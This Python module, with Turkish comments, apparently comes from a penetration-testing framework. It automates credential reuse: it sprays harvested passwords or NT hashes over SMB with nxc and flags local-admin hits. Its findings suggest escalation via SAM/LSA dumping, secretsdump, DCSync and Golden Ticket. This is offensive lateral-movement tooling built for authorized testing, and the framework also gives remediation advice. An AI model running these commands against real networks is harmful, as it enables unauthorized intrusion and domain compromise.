"""Credential reuse / yanal hareket (opt-in, aktif; 2. AŞAMA modülü).

spray/relay aşamasında bulunan kimlikleri (parola veya NT hash) bir host
listesinde otomatik dener ve nerede geçerli/yerel-admin (Pwn3d) olduğunu
raporlar. Bu, "password reuse -> yanal hareket -> Domain Admin" zincirini
otomatikleştirir.

Doğru kimlikle giriş denemesi başarısız-giriş sayacını ARTIRMAZ, dolayısıyla
spraying'in aksine kilitlenme riski yoktur. Yine de ağa aktif kimlik doğrulama
yaptığı için opt-in + onay gerektirir.

2. aşama olması şart: çalışmadan önce 1. aşama parse'ının credential store'u
doldurmuş olması gerekir (cli bunu `ctx.found_credentials`'a aktarır).
"""

from __future__ import annotations

import re

from .. import config
from ..findings import Credential, Finding, ScanReport, Severity
from ..registry import ScanContext, ScanModule
from ..runner import CommandResult, run, strip_dryrun
from . import nxc_scan

# "[+] domain\user:secret (Pwn3d!)" — host alanı satırın başındadır
_HOST_RX = re.compile(r"^(?:SMB|WINRM|RDP)\s+(\S+)\s+\d+\s+\S+\s+\[\+\]", re.MULTILINE)


def _run(ctx: ScanContext) -> list[CommandResult]:
    creds: list[Credential] = list(ctx.found_credentials or [])
    targets = ctx.reuse_targets or ctx.target
    bin_name = nxc_scan.tool().name
    results: list[CommandResult] = []

    if not creds:
        results.append(CommandResult(
            tool="reuse:skip", argv=[], returncode=None, stdout="", stderr="",
            duration=0.0, error="denenecek kimlik yok (önce spray/relay çalıştırın)"))
        return results

    for i, c in enumerate(creds):
        # nxc domain'i -d'den alır; kullanıcı adını -u'da OLDUĞU GİBİ kullanır.
        # 'DOMAIN\user' biçimini -u'ya gömmek auth'u bozar -> -u <user> -d <domain>.
        argv = [bin_name, "smb", targets, "-u", c.username]
        if c.domain:
            argv += ["-d", c.domain]
        if c.kind == "nthash":
            argv += ["-H", c.secret]
        else:
            argv += ["-p", c.secret]
        argv += ["--continue-on-success"]
        results.append(run(argv, tool=f"reuse:{i}:{c.username}",
                           timeout=ctx.timeout, dry_run=ctx.dry_run))
    return results


def parse(results: list[CommandResult], report: ScanReport) -> None:
    report.raw_outputs["reuse"] = "\n\n".join(r.combined for r in results)
    combined = strip_dryrun("\n\n".join(r.combined for r in results))
    target = report.target

    for r in results:
        if r.tool == "reuse:skip" and r.error:
            report.add_error(f"reuse: {r.error}")
            return

    # Başarılı giriş satırlarından (host, user, secret, admin) çıkar
    hits: list[tuple[str, str, str, str, bool]] = []  # host,dom,user,secret,admin
    for line in combined.splitlines():
        m = re.search(r"(\S+)\s+\d+\s+\S+\s+\[\+\]\s+([^\s\\]*)\\?([^\s:]+):(\S+?)"
                      r"(?:\s+\(Pwn3d!\))?\s*$", line)
        if m:
            host, dom, user, secret = m.group(1), m.group(2), m.group(3), m.group(4)
            admin = line.strip().endswith("(Pwn3d!)")
            hits.append((host, dom, user, secret, admin))
            report.add_credential(Credential(
                username=user, secret=secret,
                kind="nthash" if re.fullmatch(r"[0-9a-f]{32}", secret) else "password",
                domain=dom, source="reuse", host=host, admin=admin))

    if not hits:
        return

    hosts = sorted({h for h, *_ in hits})
    admin_hits = [(h, u) for h, _d, u, _s, adm in hits if adm]

    sev = Severity.CRITICAL if admin_hits else Severity.HIGH
    if config.REDACT:
        ev = "\n".join(f"{h}  {d}\\{u}" + ("  [ADMIN]" if adm else "")
                       for h, d, u, _s, adm in hits)
    else:
        ev = "\n".join(f"{h}  {d}\\{u}:{s}" + ("  [ADMIN/Pwn3d]" if adm else "")
                       for h, d, u, s, adm in hits)

    report.add(Finding(
        title=f"Credential reuse — {len(hosts)} host'ta geçerli kimlik"
              + (f", {len(admin_hits)} yerel admin" if admin_hits else ""),
        severity=sev, target=target, source="reuse",
        description="Bulunan kimlikler birden çok host'ta doğrulandı (yanal hareket). "
                    + ("Yerel admin erişimi elde edildi — DCSync/secretsdump ile "
                       "Domain Admin'e yükseltme olası." if admin_hits else ""),
        evidence=ev,
        remediation="Benzersiz yerel admin parolaları için LAPS kullanın; parola "
                    "yeniden kullanımını engelleyin; tiered admin modeli uygulayın.",
        reference="Password Reuse / Lateral Movement",
        poc="nxc smb <host> -u <user> -p <pass>   # (admin ise satır sonunda (Pwn3d!))",
        escalation=("Admin host'larda kimlik dökümü: 'nxc smb <host> -u <user> -p <pass> "
                    "--sam --lsa' veya 'secretsdump.py <domain>/<user>@<host>'. DA/DC'ye "
                    "erişim varsa --just-dc (DCSync) -> krbtgt -> Golden Ticket."
                    if admin_hits else
                    "Her host'ta --shares ile hassas veri ara; daha yetkili hesap ele "
                    "geçirmek için bu erişimle kerberoast/lsassy dene.")))


MODULE = ScanModule(
    name="reuse",
    label="credential reuse / yanal hareket (opt-in, 2. aşama)",
    run=_run,
    parse=parse,
    optin=True,
    active=True,
)
